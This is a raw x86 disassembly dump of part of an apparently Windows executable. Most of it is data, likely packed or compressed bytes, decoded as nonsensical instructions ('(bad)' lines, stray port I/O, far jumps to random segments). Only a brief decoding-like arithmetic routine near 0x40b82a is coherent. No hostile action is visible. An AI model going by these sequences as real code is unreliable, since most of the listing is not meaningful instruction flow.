  40b235:	sbb    BYTE PTR [edi+0x3d54eb15],cl
  40b23b:	jmp    0x40b20c
  40b23d:	out    0xce,al
  40b23f:	jmp    0x40b29d
  40b241:	xor    ah,bl
  40b243:	jae    0x40b2bb
  40b245:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b246:	outs   dx,DWORD PTR ds:[esi]
  40b247:	scas   al,BYTE PTR es:[edi]
  40b248:	sahf   
  40b249:	inc    edx
  40b24a:	xchg   edx,eax
  40b24b:	jo     0x40b298
  40b24d:	adc    DWORD PTR [ebp-0x621dca23],edi
  40b253:	retf   
  40b254:	or     esp,ebp
  40b256:	cmp    BYTE PTR [esi-0x25d299ea],dh
  40b25c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b25d:	mov    ebp,0x81f707d9
  40b262:	(bad)  
  40b264:	add    al,0x12
  40b266:	and    ch,BYTE PTR [edi+0x5ebc649f]
  40b26c:	outs   dx,DWORD PTR ds:[esi]
  40b26d:	(bad)  
  40b270:	rol    DWORD PTR [edi+ebx*8+0x66],0xeb
  40b275:	cmp    al,0x18
  40b277:	out    dx,eax
  40b278:	cmp    ch,dl
  40b27a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b27b:	jp     0x40b296
  40b27d:	cmp    esp,esp
  40b27f:	cmc    
  40b280:	or     al,0x17
  40b282:	test   al,0xeb
  40b284:	in     eax,dx
  40b285:	mov    ecx,0x58c23e13
  40b28a:	pop    ds
  40b28b:	jp     0x40b2e7
  40b28d:	jns    0x40b30c
  40b28f:	mov    ebx,0x9451a767
  40b294:	sbb    al,0x81
  40b296:	jmp    FWORD PTR [esi]
  40b298:	mov    ch,0xdd
  40b29a:	leave  
  40b29b:	mov    ecx,DWORD PTR [ecx]
  40b29d:	or     ch,BYTE PTR es:0x863eee10
  40b2a4:	pusha  
  40b2a5:	leave  
  40b2a6:	out    0x23,al
  40b2a8:	add    BYTE PTR [ecx+0x16],0xd4
  40b2ac:	xor    esi,DWORD PTR [edi+0xe]
  40b2af:	imul   eax,DWORD PTR [edx-0x63d09614],0xcbb45550
  40b2b9:	std    
  40b2ba:	sbb    al,al
  40b2bc:	and    DWORD PTR [edx-0x1fa4a117],0xe8a5052d
  40b2c6:	mov    ebx,DWORD PTR [eax]
  40b2c8:	in     eax,dx
  40b2c9:	adc    al,BYTE PTR [eax+0x6d3cf62b]
  40b2cf:	dec    ebx
  40b2d0:	aad    0x67
  40b2d2:	shl    ebp,0xac
  40b2d5:	seta   bh
  40b2d8:	add    DWORD PTR [edi-0x20],ecx
  40b2db:	fiadd  DWORD PTR [edi+esi*2-0x391ea1aa]
  40b2e2:	popa   
  40b2e3:	mov    bh,BYTE PTR [ebp+esi*1+0x47]
  40b2e7:	mov    esp,0x5c0f68cd
  40b2ec:	jo     0x40b28c
  40b2ee:	and    al,0x43
  40b2f0:	das    
  40b2f1:	leave  
  40b2f2:	arpl   WORD PTR [eax+0x3c],ax
  40b2f5:	stc    
  40b2f6:	call   0x22da94d9
  40b2fb:	pop    ds
  40b2fc:	movaps xmm5,xmm3
  40b2ff:	in     eax,dx
  40b300:	retf   
  40b301:	(bad)  
  40b302:	rol    BYTE PTR [ebp-0x1f],cl
  40b305:	fwait
  40b306:	jmp    0x48b6:0x2c72dcf6
  40b30d:	cmp    BYTE PTR [edi+0x2ee39f2],cl
  40b313:	adc    ecx,DWORD PTR [eax+ebx*8-0x6f]
  40b317:	dec    ecx
  40b318:	cmp    bh,BYTE PTR [edi+0x9]
  40b31b:	jmp    0x3b95d52
  40b320:	and    DWORD PTR [edx-0x71],ebx
  40b323:	push   ecx
  40b324:	pop    ebp
  40b325:	pop    esi
  40b326:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b327:	jecxz  0x40b302
  40b329:	inc    edi
  40b32a:	ins    DWORD PTR es:[edi],dx
  40b32b:	or     BYTE PTR [esp+ecx*1],bl
  40b32e:	aam    0x76
  40b330:	repz push 0x8d713005
  40b336:	xor    eax,0xeee0d6e9
  40b33b:	jg     0x40b38f
  40b33d:	ret    0x407c
  40b340:	les    edx,FWORD PTR [edx-0x4d5f6e28]
  40b346:	shl    DWORD PTR [esi-0x88845a2],cl
  40b34c:	test   BYTE PTR [ebx],cl
  40b34e:	push   ds
  40b34f:	lahf   
  40b350:	ror    eax,cl
  40b352:	sbb    al,0xa
  40b354:	test   eax,0x1e419c1d
  40b359:	mov    ecx,DWORD PTR [ebp+0x7967fca]
  40b35f:	xor    al,BYTE PTR [edi-0x3e]
  40b362:	fwait
  40b363:	aad    0x9
  40b365:	sbb    eax,0x342deb99
  40b36a:	cli    
  40b36b:	xor    BYTE PTR [ebp+0x661175f],dl
  40b371:	sub    al,0x89
  40b373:	cld    
  40b374:	and    eax,eax
  40b376:	test   eax,0x3ce5df3b
  40b37b:	ret    0x6f57
  40b37e:	hlt    
  40b37f:	xor    ebp,DWORD PTR [ebx+0x3cfa5df9]
  40b385:	push   ds
  40b386:	pop    edx
  40b387:	loope  0x40b3f5
  40b389:	sbb    eax,DWORD PTR [ecx]
  40b38b:	call   0xb9f7a9fd
  40b390:	ins    DWORD PTR es:[edi],dx
  40b391:	in     al,dx
  40b392:	mov    eax,?
  40b394:	jno    0x40b32f
  40b396:	(bad)  
  40b397:	jmp    0x40b357
  40b399:	jb     0x40b3a9
  40b39b:	sbb    eax,0x818250a9
  40b3a0:	les    edi,FWORD PTR [eax]
  40b3a2:	jg     0x40b418
  40b3a4:	xchg   edi,eax
  40b3a5:	ror    DWORD PTR [eax],1
  40b3a7:	sub    ebx,eax
  40b3a9:	push   ebx
  40b3aa:	mov    bl,0x50
  40b3ac:	gs (bad) 
  40b3af:	or     DWORD PTR [ebx+0x74e1a91f],edi
  40b3b5:	cmp    eax,0x38ef1124
  40b3ba:	mov    al,0xd8
  40b3bc:	aad    0x2f
  40b3be:	push   0x2
  40b3c0:	push   ebp
  40b3c1:	or     bh,dl
  40b3c3:	and    bl,BYTE PTR [eax+ebx*4]
  40b3c6:	ja     0x40b380
  40b3c8:	xchg   esi,eax
  40b3c9:	rcl    BYTE PTR [esi-0x68ec1d53],0xcf
  40b3d0:	(bad)  
  40b3d1:	cs (bad) 
  40b3d3:	dec    ecx
  40b3d4:	call   0x233d:0x9248a1dc
  40b3db:	pop    ss
  40b3dc:	add    al,0x1d
  40b3de:	out    dx,al
  40b3df:	add    eax,edi
  40b3e1:	cmp    BYTE PTR [ebp-0x5bcaf279],0xa4
  40b3e8:	bound  ebp,QWORD PTR [edx+0x7eaf796d]
  40b3ee:	fidiv  WORD PTR [edi]
  40b3f0:	add    al,0x95
  40b3f2:	cdq    
  40b3f3:	add    esp,ebx
  40b3f5:	mov    ecx,DWORD PTR [eax]
  40b3f7:	(bad)  
  40b3f9:	sbb    edi,edx
  40b3fb:	add    eax,0xf94f46ce
  40b400:	push   0xda3bdf2b
  40b405:	ja     0x40b82a
  40b40b:	mov    edx,DWORD PTR [ebp-0x2c]
  40b40e:	jmp    0x40bcba
  40b413:	jmp    0x40b82a
  40b418:	ror    DWORD PTR [edi-0x34],cl
  40b41b:	aam    0x4c
  40b41d:	pop    ebp
  40b41e:	rcl    DWORD PTR [ecx-0x44],cl
  40b421:	xchg   esp,eax
  40b422:	(bad)  
  40b423:	mov    ah,0x42
  40b425:	jg     0x40b428
  40b427:	or     ebp,eax
  40b429:	xchg   BYTE PTR [esi+0x7e],bh
  40b42c:	jo     0x40b4a7
  40b42e:	jle    0x40b4ae
  40b430:	das    
  40b431:	test   eax,0x8a93343d
  40b436:	jmp    0x1919:0xc9452309
  40b43d:	ret    0xed5c
  40b440:	or     al,0xee
  40b442:	push   0x2a
  40b444:	retf   
  40b445:	daa    
  40b446:	(bad)  
  40b447:	pop    ds
  40b448:	je     0x40b47e
  40b44a:	call   0x1c34:0x990b566d
  40b451:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b452:	dec    edx
  40b453:	(bad)  
  40b454:	push   ss
  40b455:	pusha  
  40b456:	sub    eax,0xa1463f84
  40b45b:	in     al,dx
  40b45c:	mov    DWORD PTR [edi+edx*1+0x3dd16d73],eax
  40b463:	sbb    ebp,DWORD PTR [eax+esi*2-0x41]
  40b467:	dec    esi
  40b468:	push   es
  40b469:	mov    dh,0x21
  40b46b:	push   edi
  40b46c:	pop    edx
  40b46d:	lea    ecx,[ebx-0x21b548f9]
  40b473:	enter  0x10a2,0x95
  40b477:	jb     0x40b4ef
  40b479:	mov    ds:0x67f69f04,eax
  40b47e:	pop    es
  40b47f:	(bad)  
  40b480:	mov    cl,0x4
  40b482:	in     eax,0x7e
  40b484:	ds cmp al,0x86
  40b487:	ds mov ah,cl
  40b48a:	add    al,0xc8
  40b48c:	pop    edx
  40b48d:	inc    eax
  40b48e:	cmp    eax,0x5214b06a
  40b493:	scas   eax,DWORD PTR es:[edi]
  40b494:	sub    al,0xda
  40b496:	ins    DWORD PTR es:[edi],dx
  40b497:	mov    eax,ds:0x99b10897
  40b49c:	repnz in al,dx
  40b49e:	imul   esi,DWORD PTR [ebx+0x42cd1fe4],0xffffffac
  40b4a5:	xor    al,0xad
  40b4a7:	jmp    0xa62347f8
  40b4ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b4ad:	pop    es
  40b4ae:	mov    WORD PTR [esi],fs
  40b4b0:	ins    BYTE PTR es:[edi],dx
  40b4b1:	in     al,dx
  40b4b2:	mov    esi,0x3044429d
  40b4b7:	ror    DWORD PTR [ebx],0x61
  40b4ba:	pop    ebp
  40b4bb:	jae    0x40b465
  40b4bd:	jecxz  0x40b4e4
  40b4bf:	fist   WORD PTR es:[ecx+0x1a]
  40b4c3:	adc    eax,DWORD PTR [ebx]
  40b4c5:	mov    ch,0x46
  40b4c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b4c8:	mov    ?,WORD PTR [ebx]
  40b4ca:	xor    BYTE PTR [ebx-0x2],al
  40b4cd:	(bad)  
  40b4ce:	sub    BYTE PTR [ecx-0x2],ch
  40b4d1:	ror    DWORD PTR [ebx],0x55
  40b4d4:	push   esi
  40b4d5:	add    al,0x35
  40b4d7:	ror    BYTE PTR [ecx+0x774fb41d],1
  40b4dd:	scas   al,BYTE PTR es:[edi]
  40b4de:	out    dx,eax
  40b4df:	pop    ds
  40b4e0:	cmp    ah,BYTE PTR [eax+eax*8]
  40b4e3:	mov    ebp,0xa106c590
  40b4e8:	(bad)  
  40b4e9:	mov    dh,0x9a
  40b4eb:	repz out dx,eax
  40b4ed:	shr    DWORD PTR [ebp+0x3038b8e1],0xa5
  40b4f4:	inc    ebx
  40b4f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b4f6:	add    eax,0x3d66e522
  40b4fb:	rcr    BYTE PTR [esi-0x38],cl
  40b4fe:	fld    TBYTE PTR [esi-0x4bbc5fb6]
  40b504:	adc    al,0xb2
  40b506:	icebp  
  40b507:	fild   WORD PTR [ebp+0x68]
  40b50a:	fsub   DWORD PTR [edx]
  40b50c:	fwait
  40b50d:	cld    
  40b50e:	(bad)  
  40b50f:	in     al,dx
  40b510:	xchg   esi,eax
  40b511:	loop   0x40b52f
  40b513:	outs   dx,DWORD PTR ds:[esi]
  40b514:	ror    edi,0x70
  40b517:	mov    cl,0xf9
  40b519:	dec    eax
  40b51a:	cs jmp 0x40b59a
  40b51d:	ret    
  40b51e:	mov    WORD PTR [edx-0x26],ds
  40b521:	sbb    eax,DWORD PTR [eax]
  40b523:	mov    dh,0x63
  40b525:	xor    esp,esi
  40b527:	sahf   
  40b528:	loope  0x40b52a
  40b52a:	pop    ecx
  40b52b:	mov    esi,0xccbcbb87
  40b530:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b531:	xlat   BYTE PTR ds:[ebx]
  40b532:	pop    edx
  40b533:	add    BYTE PTR [eax-0x76],dh
  40b536:	cs iret 
  40b538:	push   eax
  40b539:	xchg   ebx,eax
  40b53a:	loop   0x40b58e
  40b53c:	imul   esp
  40b53e:	jb     0x40b5a2
  40b540:	call   0x9f37:0xff0efe1f
  40b547:	push   eax
  40b548:	dec    edi
  40b549:	adc    DWORD PTR [esp+esi*4],esi
  40b54c:	cmc    
  40b54d:	fsubr  st(5),st
  40b54f:	xor    al,0x56
  40b551:	retf   
  40b552:	push   esp
  40b553:	xor    eax,DWORD PTR [edx+eax*2+0x5a]
  40b557:	jge    0x40b5a8
  40b559:	cmp    DWORD PTR [ecx],0xfffffff1
  40b55c:	cmp    esp,edx
  40b55e:	dec    ecx
  40b55f:	sahf   
  40b560:	and    ah,ch
  40b562:	mov    al,0xe4
  40b564:	sbb    esi,DWORD PTR [ebp-0x7db8e7ce]
  40b56a:	aas    
  40b56b:	mov    DWORD PTR [ecx+0x1994bde7],ebp
  40b571:	fs call 0x5c8c9a06
  40b577:	repz mov ebp,0x5e48fb5f
  40b57d:	mov    ah,0xc5
  40b57f:	test   al,0xbf
  40b582:	sbb    DWORD PTR [edi],ebx
  40b584:	adc    DWORD PTR [edx-0x2e],eax
  40b587:	pop    edx
  40b588:	mov    ds:0xb8c4d52,al
  40b58d:	bound  esi,QWORD PTR [ecx]
  40b58f:	xor    dl,BYTE PTR [ecx]
  40b591:	data16 aas 
  40b593:	in     eax,dx
  40b594:	mov    bl,0x41
  40b596:	push   ds
  40b597:	retf   0xc88b
  40b59a:	push   edx
  40b59b:	dec    esi
  40b59c:	rcr    BYTE PTR [ecx+0x294736dc],0x49
  40b5a3:	(bad)  
  40b5a4:	rol    DWORD PTR [edi],1
  40b5a6:	mov    ebx,DWORD PTR [edi-0x45]
  40b5a9:	in     al,0xee
  40b5ab:	imul   ebp,DWORD PTR [eax],0x61
  40b5ae:	xor    DWORD PTR [edx-0x28],esi
  40b5b1:	jge    0x40b586
  40b5b3:	popa   
  40b5b4:	push   ecx
  40b5b5:	sub    BYTE PTR [ebx+0x76],bh
  40b5b8:	mov    esp,0x1e34f3a7
  40b5bd:	jp     0x40b5b6
  40b5bf:	push   0x3643b9fb
  40b5c4:	call   0xe3b9470f
  40b5c9:	inc    eax
  40b5ca:	neg    dh
  40b5cc:	inc    ebx
  40b5cd:	sub    ebx,edx
  40b5cf:	cmp    al,BYTE PTR [ecx]
  40b5d1:	gs hlt 
  40b5d3:	pop    ss
  40b5d4:	xchg   ebp,eax
  40b5d5:	push   ebx
  40b5d6:	aam    0x3f
  40b5d8:	lea    ecx,[ebx-0x16]
  40b5db:	stc    
  40b5dc:	sub    ebp,ebp
  40b5de:	pop    edi
  40b5df:	arpl   WORD PTR [edi],dx
  40b5e1:	cli    
  40b5e2:	and    bh,bl
  40b5e4:	fist   WORD PTR [ebp+ebp*2+0x4cc28a4b]
  40b5eb:	pop    ds
  40b5ec:	mov    al,0xa5
  40b5ee:	pusha  
  40b5ef:	push   ss
  40b5f0:	mov    eax,ds:0x69d135b4
  40b5f5:	lods   al,BYTE PTR ds:[esi]
  40b5f6:	loop   0x40b620
  40b5f8:	scas   eax,DWORD PTR es:[edi]
  40b5f9:	sbb    al,0x4d
  40b5fb:	mov    ebp,0xae511718
  40b600:	push   edx
  40b601:	pop    eax
  40b602:	fcomip st,st(1)
  40b604:	dec    esi
  40b605:	jb     0x40b5f9
  40b607:	pop    es
  40b608:	mov    al,ds:0x405595c6
  40b60d:	aas    
  40b60e:	aaa    
  40b60f:	test   esp,ebx
  40b611:	sbb    DWORD PTR [ecx],0xffffffcc
  40b614:	cli    
  40b615:	std    
  40b616:	imul   edx,DWORD PTR [esi+0x12],0x3e8c52af
  40b61d:	mov    edx,0xb4429ce3
  40b622:	add    DWORD PTR [edi+0x27e20829],ebp
  40b628:	test   esi,edi
  40b62a:	and    al,0x68
  40b62c:	test   eax,0xf98fba53
  40b631:	ret    0xcc80
  40b634:	sub    DWORD PTR [ebx+0x7a],0xfffffff0
  40b638:	cmp    DWORD PTR ds:0x66737e1e,edx
  40b63e:	cwde   
  40b63f:	mov    gs,WORD PTR [esi+0x7e]
  40b642:	xor    dh,cl
  40b644:	push   eax
  40b645:	jno    0x40b622
  40b647:	js     0x40b666
  40b649:	pusha  
  40b64a:	ins    BYTE PTR es:[edi],dx
  40b64b:	jbe    0x40b66f
  40b64d:	int    0x9b
  40b64f:	(bad)  
  40b650:	sbb    eax,0xdbde185d
  40b655:	push   edx
  40b656:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b657:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b658:	push   edx
  40b659:	sbb    eax,0x2774a711
  40b65e:	ins    DWORD PTR es:[edi],dx
  40b65f:	or     BYTE PTR [ecx],bh
  40b661:	mov    ah,0xcd
  40b663:	xor    esi,DWORD PTR [esi+ecx*2]
  40b666:	scas   eax,DWORD PTR es:[edi]
  40b667:	popa   
  40b668:	sti    
  40b669:	push   edx
  40b66a:	xor    eax,0x9f7457d6
  40b66f:	push   ebp
  40b670:	imul   ecx,DWORD PTR gs:[edx+0x6551ec96],0x6d
  40b678:	cdq    
  40b679:	add    BYTE PTR [edi-0x43c8738b],dl
  40b67f:	xor    ch,ch
  40b681:	ins    BYTE PTR es:[edi],dx
  40b682:	les    edx,FWORD PTR [edi+ecx*8]
  40b685:	mov    bh,0xac
  40b687:	(bad)  
  40b688:	mov    BYTE PTR [eax-0x3e],al
  40b68b:	xchg   edi,eax
  40b68c:	mov    al,ds:0xf27a3e34
  40b691:	lods   al,BYTE PTR ds:[esi]
  40b692:	fsub   DWORD PTR [ebp+0x75]
  40b695:	fwait
  40b696:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b697:	ja     0x40b6a8
  40b699:	push   ebx
  40b69a:	or     eax,DWORD PTR [esp+edx*8-0x1e6c7763]
  40b6a1:	xor    ebp,DWORD PTR [edi+ebx*8-0x2]
  40b6a5:	adc    al,0x24
  40b6a7:	xchg   esp,eax
  40b6a8:	lds    ebx,FWORD PTR [eax]
  40b6aa:	dec    edx
  40b6ab:	cmp    DWORD PTR [edi+ebx*2+0x4c],ecx
  40b6af:	push   ss
  40b6b0:	push   esi
  40b6b1:	mov    BYTE PTR [ecx+eiz*8],cl
  40b6b4:	push   ds
  40b6b5:	ins    BYTE PTR es:[edi],dx
  40b6b6:	xor    eax,0x4c2899fd
  40b6bb:	lea    edi,[eax]
  40b6bd:	xchg   esi,eax
  40b6be:	out    0x1b,al
  40b6c0:	xor    al,0x23
  40b6c2:	cwde   
  40b6c3:	sar    ebx,0xb5
  40b6c6:	sub    al,0xbe
  40b6c8:	fadd   st(6),st
  40b6ca:	(bad)  
  40b6cc:	call   0x9cfa:0xa21e4d8a
  40b6d3:	adc    ebx,0xe
  40b6d6:	jno    0x40b743
  40b6d8:	xor    ah,ch
  40b6da:	dec    ebx
  40b6db:	in     eax,0x49
  40b6dd:	xchg   DWORD PTR [esp+esi*8-0x105abe5c],ebx
  40b6e4:	call   0x42ac:0x5110bafd
  40b6eb:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6ed:	lock mov cl,0x90
  40b6f0:	bswap  edx
  40b6f2:	(bad)  
  40b6f3:	arpl   WORD PTR [ecx-0x74],cx
  40b6f6:	pushf  
  40b6f7:	adc    al,0x59
  40b6f9:	mov    bh,0x27
  40b6fb:	pop    edx
  40b6fc:	(bad)
  40b6ff:	call   0x2040:0x368f2b0d
  40b706:	mov    cl,0x70
  40b708:	inc    esi
  40b709:	mov    WORD PTR [ecx+0x30],es
  40b70c:	(bad)  
  40b70d:	paddq  mm3,QWORD PTR [eax]
  40b710:	sub    DWORD PTR [eax-0x5e],edx
  40b713:	xchg   ecx,eax
  40b714:	xchg   esi,eax
  40b715:	sbb    DWORD PTR [eax-0x679c139],edi
  40b71b:	rcl    DWORD PTR [edx],cl
  40b71d:	mov    dh,0x4a
  40b71f:	adc    ebx,edi
  40b721:	mov    dl,ch
  40b723:	add    al,0xed
  40b725:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b726:	cwde   
  40b727:	cmp    al,0xa
  40b72a:	and    BYTE PTR ds:0x95950532,dh
  40b730:	rcr    ch,cl
  40b732:	les    ebp,FWORD PTR [eax]
  40b734:	nop
  40b735:	mov    ds:0xb5aed69f,eax
  40b73a:	mov    ds:0xaf5c0a9,al
  40b73f:	and    eax,0x26319f1b
  40b744:	dec    edi
  40b745:	cmp    al,0x9
  40b747:	or     BYTE PTR [edi+0x6c],cl
  40b74a:	icebp  
  40b74b:	rcl    edx,cl
  40b74d:	mov    bh,0x56
  40b74f:	(bad)  
  40b750:	fst    QWORD PTR [ebp-0x419fc9dc]
  40b756:	push   ecx
  40b757:	jle    0x40b734
  40b759:	mov    ebp,0x3b4d1d53
  40b75e:	fsub   DWORD PTR [ebx+0x418f2ed7]
  40b764:	pusha  
  40b765:	outs   dx,BYTE PTR ds:[esi]
  40b766:	movd   mm4,ebp
  40b769:	or     eax,0xbdce148b
  40b76e:	cld    
  40b76f:	sbb    DWORD PTR [ebx+0x7079a466],esi
  40b775:	dec    esp
  40b776:	cmp    al,dl
  40b778:	fisubr DWORD PTR [ebx]
  40b77a:	in     al,0x19
  40b77c:	inc    esi
  40b77d:	lahf   
  40b77e:	jmp    0x73e0df79
  40b783:	or     al,0xda
  40b785:	push   ds
  40b786:	or     DWORD PTR [ecx+eiz*4+0x55],0x4d
  40b78b:	inc    eax
  40b78c:	lea    esi,ds:0xb0b283b0
  40b792:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b793:	pop    es
  40b794:	xchg   edi,eax
  40b795:	jo     0x40b78f
  40b797:	xchg   edi,eax
  40b798:	repnz dec ebx
  40b79a:	mov    eax,0x25c17e04
  40b79f:	mov    al,0xec
  40b7a1:	and    eax,0x351f2dce
  40b7a6:	std    
  40b7a7:	jge    0x40b7fc
  40b7a9:	bound  esp,QWORD PTR [edi-0xd]
  40b7ac:	xor    DWORD PTR [ecx],ebp
  40b7ae:	shr    BYTE PTR [edi-0x5b],1
  40b7b1:	adc    DWORD PTR ss:[esi+ebp*2+0x6b369424],eax
  40b7b9:	ins    DWORD PTR es:[edi],dx
  40b7ba:	aad    0x2f
  40b7bc:	lods   eax,DWORD PTR ds:[esi]
  40b7bd:	loopne 0x40b797
  40b7bf:	mov    al,0x79
  40b7c1:	mov    dh,0x27
  40b7c3:	or     al,0x3f
  40b7c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b7c6:	fsubr  DWORD PTR [edx+0x1c1feec7]
  40b7cc:	ret    0x6ee1
  40b7cf:	out    dx,eax
  40b7d0:	(bad)  
  40b7d2:	cmp    cl,BYTE PTR [ecx+0x6c610f1b]
  40b7d8:	or     BYTE PTR [edi-0x57],0x27
  40b7dc:	repz adc cl,ch
  40b7df:	mov    eax,0x3b71c6f9
  40b7e4:	pusha  
  40b7e5:	mov    edx,0x5d940a9f
  40b7ea:	mov    eax,ds:0x21577b8
  40b7ef:	shl    DWORD PTR [esi-0x66],0xc5
  40b7f3:	cmc    
  40b7f4:	jp     0x40b790
  40b7f6:	adc    BYTE PTR [eax],ch
  40b7f8:	fidivr DWORD PTR [edi]
  40b7fa:	xor    esp,DWORD PTR [edi+0x564d6f5c]
  40b800:	(bad)  
  40b802:	push   edi
  40b803:	call   0x132:0x9569625e
  40b80a:	inc    ecx
  40b80b:	loope  0x40b81f
  40b80d:	pop    ecx
  40b80e:	arpl   WORD PTR [ebp+0x431e6ad7],ax
  40b814:	dec    edx
  40b815:	popa   
  40b816:	jae    0x40b824
  40b818:	ds dec edx
  40b81a:	sti    
  40b81b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b81c:	pushf  
  40b81d:	inc    ebp
  40b81e:	xchg   ch,dh
  40b820:	mov    ch,0x27
  40b822:	in     al,0x4c
  40b824:	xor    ch,BYTE PTR [ecx-0x4c42f660]
  40b82a:	mov    edx,DWORD PTR [ebp-0x34]
  40b82d:	mov    edi,DWORD PTR [ebp-0x4]
  40b830:	xor    edx,eax
  40b832:	xor    edi,eax
  40b834:	add    edi,ecx
  40b836:	add    edx,ecx
  40b838:	imul   edx,edi
  40b83b:	mov    edi,DWORD PTR [ebp-0x8]
  40b83e:	mov    ebx,DWORD PTR [ebp-0x10]
  40b841:	sub    ebx,edi
  40b843:	cmp    ebx,edx
  40b845:	ja     0x40b853
  40b84b:	mov    edx,DWORD PTR [ebp-0x30]
  40b84e:	jmp    0x40bcba
  40b853:	mov    edx,DWORD PTR [ebp-0x38]
  40b856:	mov    edi,DWORD PTR [ebp-0x4]
  40b859:	xor    edx,eax
  40b85b:	xor    edi,eax
  40b85d:	add    edi,ecx
  40b85f:	add    edx,ecx
  40b861:	imul   edx,edi
  40b864:	mov    edi,DWORD PTR [ebp-0x8]
  40b867:	mov    ebx,DWORD PTR [ebp-0x10]
  40b86a:	sub    ebx,edi
  40b86c:	cmp    ebx,edx
  40b86e:	ja     0x40b87c
  40b874:	mov    edx,DWORD PTR [ebp-0x34]
  40b877:	jmp    0x40bcba
  40b87c:	mov    edx,DWORD PTR [ebp-0x3c]
  40b87f:	mov    edi,DWORD PTR [ebp-0x4]
  40b882:	xor    edx,eax
  40b884:	xor    edi,eax
  40b886:	add    edx,ecx
  40b888:	add    edi,ecx
  40b88a:	imul   edx,edi
  40b88d:	mov    edi,DWORD PTR [ebp-0x8]
  40b890:	mov    ebx,DWORD PTR [ebp-0x10]
  40b893:	jmp    0x40bcaa
  40b898:	xor    eax,DWORD PTR [esi-0x7c]
  40b89b:	outs   dx,DWORD PTR ds:[esi]
  40b89c:	jne    0x40b91b
  40b89e:	std    
  40b89f:	inc    edx
  40b8a0:	sbb    DWORD PTR [eax+ebx*8],0x44
  40b8a4:	jl     0x40b84f
  40b8a6:	jge    0x40b905
  40b8a8:	loop   0x40b82c
  40b8aa:	jle    0x40b92a
  40b8ac:	jo     0x40b927
  40b8ae:	jle    0x40b92e
  40b8b0:	es mov eax,0xd04fdbd
  40b8b6:	mov    ds:0xfcadf29e,eax
  40b8bb:	je     0x40b854
  40b8bd:	xchg   esp,eax
  40b8be:	test   BYTE PTR [edx+0x2a941793],dl
  40b8c4:	adc    eax,0x7e67c31
  40b8c9:	add    al,0x25
  40b8cb:	jae    0x40b877
  40b8cd:	repz iret 
  40b8cf:	call   0x5b1:0x9f649f1
  40b8d6:	sub    BYTE PTR [edx],ah
  40b8d8:	adc    al,0x3
  40b8da:	jl     0x40b8b2
  40b8dc:	mov    ds:0xba46df2f,eax
  40b8e1:	mov    fs:0x7eefc493,al
  40b8e7:	mov    ebx,0x34bd706f
  40b8ec:	dec    eax
  40b8ed:	add    al,0x24
  40b8ef:	cmp    DWORD PTR ds:0xce40e7e,ebp
  40b8f5:	(bad)  
  40b8f6:	jmp    0x5e627253
  40b8fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b8fc:	jnp    0x40b89d
  40b8fe:	cld    
  40b8ff:	mov    ds:0x241c9bf4,eax
  40b904:	sub    ch,dh
  40b906:	leave  
  40b907:	aam    0x99
  40b909:	push   ds
  40b90a:	loop   0x40b91f
  40b90c:	sahf   
  40b90d:	repz dec ebx
  40b90f:	stos   DWORD PTR es:[edi],eax
  40b910:	cwde   
  40b911:	mov    esi,0xe06f74e0
  40b916:	(bad)  
  40b917:	push   0x9b537aac
  40b91c:	aam    0xf9
  40b91e:	adc    eax,0x568fc439
  40b923:	jle    0x40b994
  40b925:	neg    DWORD PTR [edi-0x374c36be]
  40b92b:	ins    DWORD PTR es:[edi],dx
  40b92c:	les    esi,FWORD PTR [ebx-0x14]
  40b92f:	cli    
  40b930:	pop    eax
  40b931:	(bad)  
  40b932:	xor    al,0xa4
  40b934:	(bad)  
  40b935:	sub    DWORD PTR [ecx+0x24],ecx
  40b938:	xor    BYTE PTR [eax],al
  40b93a:	je     0x40b924
  40b93c:	dec    esi
  40b93d:	pop    es
  40b93e:	mov    al,0x3b
  40b940:	cs pop esi
  40b942:	inc    esp
  40b943:	sub    ebx,DWORD PTR [edx]
  40b945:	cmp    BYTE PTR [ecx+0x3c42cdb2],0x2b
  40b94c:	sbb    edx,esi
  40b94e:	(bad)  
  40b94f:	adc    bh,bl
  40b951:	push   esi
  40b952:	push   esp
  40b953:	das    
  40b954:	mov    bl,0x71
  40b956:	sbb    ebp,DWORD PTR [edi]
  40b958:	and    eax,0x65f356d6
  40b95d:	mov    ss,eax
  40b95f:	sub    ecx,DWORD PTR [edx+esi*4]
  40b962:	pop    esi
  40b963:	cmp    BYTE PTR [esi],cl
  40b965:	sub    eax,0x8c153496
  40b96a:	int3   
  40b96b:	inc    edi
  40b96c:	mov    al,0x91
  40b96e:	xchg   esp,eax
  40b96f:	mov    ah,0xe
  40b971:	jo     0x40b95c
  40b973:	retf   
  40b974:	inc    ecx
  40b975:	std    
  40b976:	mov    eax,ds:0x40ab73c
  40b97b:	pop    esi
  40b97c:	lods   eax,DWORD PTR ds:[esi]
  40b97d:	fcomi  st,st(3)
  40b97f:	repnz and BYTE PTR [edi+0x28a36f05],cl
  40b986:	dec    ebx
  40b987:	gs into 
  40b989:	idiv   ah
  40b98b:	pusha  
  40b98c:	aaa    
  40b98d:	mov    bl,dh
  40b98f:	(bad)  
  40b990:	hlt    
  40b991:	test   eax,0xd509fe0d
  40b996:	and    DWORD PTR [edi+0x70],ebp
  40b999:	das    
  40b99a:	push   ebx
  40b99b:	out    dx,al
  40b99c:	psadbw mm1,mm3
  40b99f:	jmp    0xdcdb:0xc142d516
  40b9a6:	inc    edi
  40b9a7:	adc    bh,ah
  40b9a9:	cs std 
  40b9ab:	jmp    0x40b98c
  40b9ad:	inc    eax
  40b9ae:	inc    esp
